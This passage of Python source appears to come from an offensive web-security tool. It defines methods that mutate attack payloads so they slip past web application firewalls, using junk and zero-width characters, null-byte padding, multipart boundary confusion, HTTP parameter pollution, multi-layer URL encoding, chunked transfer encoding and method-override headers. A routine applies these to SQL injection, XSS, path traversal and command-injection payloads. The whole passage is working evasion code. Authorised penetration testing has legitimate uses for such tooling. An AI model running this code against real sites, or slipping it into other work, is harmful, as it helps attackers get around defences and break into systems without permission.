        original_ord = ord(chars[idx])
        # Flip a random bit in the lower 5 bits to stay in printable range
        bit = 1 << random.randint(0, 4)
        flipped = original_ord ^ bit
        if 32 <= flipped <= 126:
            chars[idx] = chr(flipped)
        return ''.join(chars)
    
    def _mutate_junk_insert(self, payload: str) -> str:
        """Insert junk characters that parsers typically strip.
        
        Inserts characters like null bytes, backspaces, zero-width spaces,
        and soft hyphens at random positions within the payload.
        
        Args:
            payload: The payload to mutate.
        
        Returns:
            Payload with junk characters inserted.
        """
        junk_chars = [
            '%00', '%08', '%0d',       # null byte, backspace, carriage return
            '\u200b', '\u200c',         # zero-width space, zero-width non-joiner
            '\u200d', '\ufeff',         # zero-width joiner, BOM
            '\u00ad',                   # soft hyphen
        ]
        result = list(payload)
        # Insert 1-3 junk chars at random positions
        num_inserts = random.randint(1, 3)
        for _ in range(num_inserts):
            pos = random.randint(0, len(result))
            junk = random.choice(junk_chars)
            result.insert(pos, junk)
        return ''.join(result)
    
    def _mutate_boundary_exploit(self, payload: str) -> str:
        """Exploit boundary conditions with max-length padding and null
        terminators.
        
        Adds padding to push payload content to boundary edges where WAF
        parsers may truncate or fail.
        
        Args:
            payload: The payload to mutate.
        
        Returns:
            Payload with boundary condition exploitation applied.
        """
        strategies = [
            # Null terminator prefix
            lambda p: '%00' + p,
            # Null terminator suffix
            lambda p: p + '%00',
            # Padding with junk before payload (WAF buffer overflow attempt)
            lambda p: 'A' * random.randint(128, 512) + p,
            # Padding after payload
            lambda p: p + 'A' * random.randint(128, 512),
            # Mixed padding with null terminators
            lambda p: 'X' * random.randint(64, 256) + '%00' + p + '%00',
            # Newline padding
            lambda p: '\r\n' * random.randint(8, 32) + p,
        ]
        strategy = random.choice(strategies)
        return strategy(payload)
    
    def _mutate_content_type_confusion(self, payload: str) -> str:
        """Generate content-type confusion through multipart boundary
        manipulation.
        
        Wraps the payload in multipart form data structures that may confuse
        WAF content-type parsing.
        
        Args:
            payload: The payload to mutate.
        
        Returns:
            Payload wrapped in content-type confusion structure.
        """
        boundary = ''.join(random.choices(
            'abcdefghijklmnopqrstuvwxyz0123456789', k=16
        ))
        templates = [
            # Standard multipart wrapping
            (f'--{boundary}\r\n'
             f'Content-Disposition: form-data; name="input"\r\n\r\n'
             f'{payload}\r\n--{boundary}--'),
            # Filename trick
            (f'--{boundary}\r\n'
             f'Content-Disposition: form-data; name="file"; filename="{payload}"\r\n'
             f'Content-Type: application/octet-stream\r\n\r\n'
             f'{payload}\r\n--{boundary}--'),
            # Double Content-Disposition
            (f'--{boundary}\r\n'
             f'Content-Disposition: form-data; name="safe"\r\n'
             f'Content-Disposition: form-data; name="input"\r\n\r\n'
             f'{payload}\r\n--{boundary}--'),
        ]
        return random.choice(templates)
    
    def _mutate_hpp(self, payload: str) -> str:
        """Generate HTTP parameter pollution variants.
        
        Splits the payload across multiple parameter instances to exploit
        differences in how WAFs and backends handle duplicate parameters.
        
        Args:
            payload: The payload to mutate.
        
        Returns:
            HPP variant of the payload.
        """
        if len(payload) < 4:
            return payload
        
        strategies = [
            # Split into two parameters
            lambda p: f'input={p[:len(p)//2]}&input={p[len(p)//2:]}',
            # Duplicate with junk first
            lambda p: f'input=harmless&input={p}',
            # Array notation
            lambda p: f'input[]={p[:len(p)//2]}&input[]={p[len(p)//2:]}',
            # Mixed case parameter names
            lambda p: f'input={p}&INPUT={p}&Input={p}',
            # Semicolon delimiter (some servers accept it)
            lambda p: f'input={p[:len(p)//2]};input={p[len(p)//2:]}',
        ]
        strategy = random.choice(strategies)
        return strategy(payload)
    
    def _mutate_double_encode(self, payload: str) -> str:
        """Apply double encoding chains to the payload.
        
        Double-encodes characters to bypass WAFs that only decode one layer
        of encoding.
        
        Args:
            payload: The payload to mutate.
        
        Returns:
            Double-encoded payload variant.
        """
        strategies = [
            # Full double URL encode
            lambda p: ''.join(f'%25{ord(c):02x}' for c in p),
            # Selective double encode (only special chars)
            lambda p: ''.join(
                f'%25{ord(c):02x}' if not c.isalnum() else c for c in p
            ),
            # Triple encode
            lambda p: ''.join(f'%2525{ord(c):02x}' for c in p),
            # Mixed single and double encode
            lambda p: ''.join(
                f'%25{ord(c):02x}' if random.random() < 0.5
                else f'%{ord(c):02x}' for c in p
            ),
        ]
        strategy = random.choice(strategies)
        return strategy(payload)
    
    def _mutate_chunked_variation(self, payload: str) -> str:
        """Generate chunked transfer encoding variations.
        
        Splits the payload into chunks of varying sizes with optional
        chunk extensions that may confuse WAF stream processing.
        
        Args:
            payload: The payload to mutate.
        
        Returns:
            Chunked encoding variant of the payload.
        """
        result = []
        i = 0
        while i < len(payload):
            # Random chunk size between 1 and 5
            chunk_size = random.randint(1, min(5, len(payload) - i))
            chunk = payload[i:i + chunk_size]
            # Optionally add chunk extensions
            extension = ''
            if random.random() < 0.3:
                ext_name = ''.join(random.choices('abcdefghij', k=4))
                extension = f';{ext_name}={"".join(random.choices("0123456789", k=2))}'
            result.append(f'{chunk_size:x}{extension}\r\n{chunk}\r\n')
            i += chunk_size
        result.append('0\r\n\r\n')
        return ''.join(result)
    
    def advanced_bypass(self, payload: str, waf_type: str = None) -> list:
        """Advanced WAF bypass with evasion engine integration"""
        variants = self.bypass_techniques(payload, waf_type)
        
        try:
            from utils.evasion import PayloadMutator
            mutator = PayloadMutator()
            
            variants.append(mutator.mutate(payload, 'encode_chain'))
            variants.append(mutator.mutate(payload, 'mixed_encode'))
            variants.append(mutator.mutate(payload, 'case_alternate'))
            
            if any(kw in payload.upper() for kw in ['SELECT', 'UNION', 'AND', 'OR']):
                variants.append(mutator.mutate(payload, 'comment_inject'))
                variants.append(mutator.mutate(payload, 'concat_split'))
                variants.append(mutator.mutate(payload, 'whitespace_random'))
            
            if '<' in payload or 'script' in payload.lower():
                variants.append(mutator.mutate(payload, 'html_entity'))
                variants.append(mutator.mutate(payload, 'js_obfuscate'))
        except Exception:
            pass
        
        # XSS WAF evasion payloads
        if '<' in payload or 'script' in payload.lower() or 'alert' in payload.lower():
            variants.extend(self.xss_waf_evasion(payload))
        
        # Regex bypass variants for detected contexts
        if any(kw in payload.upper() for kw in ['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE']):
            variants.extend(self.regex_bypass_generate(payload, context='sql'))
        if '<' in payload or 'script' in payload.lower():
            variants.extend(self.regex_bypass_generate(payload, context='xss'))
        if '../' in payload or '..\\' in payload:
            variants.extend(self.regex_bypass_generate(payload, context='path_traversal'))
        if any(c in payload for c in [';', '|', '&&', '`']):
            variants.extend(self.regex_bypass_generate(payload, context='cmdi'))
        
        # Custom mutation engine variants
        variants.extend(self.custom_mutation_engine(payload))
        
        return list(set(variants))
    
    def generate_chunked_request(self, url: str, payload: str) -> dict:
        """Generate Transfer-Encoding chunked request for WAF bypass"""
        chunk_size = random.randint(1, 4)
        chunks = []
        i = 0
        while i < len(payload):
            end = min(i + chunk_size, len(payload))
            chunk_data = payload[i:end]
            chunks.append(f"{len(chunk_data):x}\r\n{chunk_data}\r\n")
            i = end
            chunk_size = random.randint(1, 4)
        chunks.append("0\r\n\r\n")
        
        return {
            'url': url,
            'headers': {
                'Transfer-Encoding': 'chunked',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            'body': ''.join(chunks),
        }
    
    def method_override_bypass(self, url: str, data: dict = None) -> list:
        """Generate requests with HTTP method override headers"""
        overrides = [
            {'X-HTTP-Method': 'PUT'},
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-Method-Override': 'PUT'},
            {'X-HTTP-Method': 'PATCH'},
        ]
        
        results = []
        for override in overrides:
            results.append({
                'url': url,
                'method': 'POST',
                'data': data,
                'headers': override,
            })
        return results
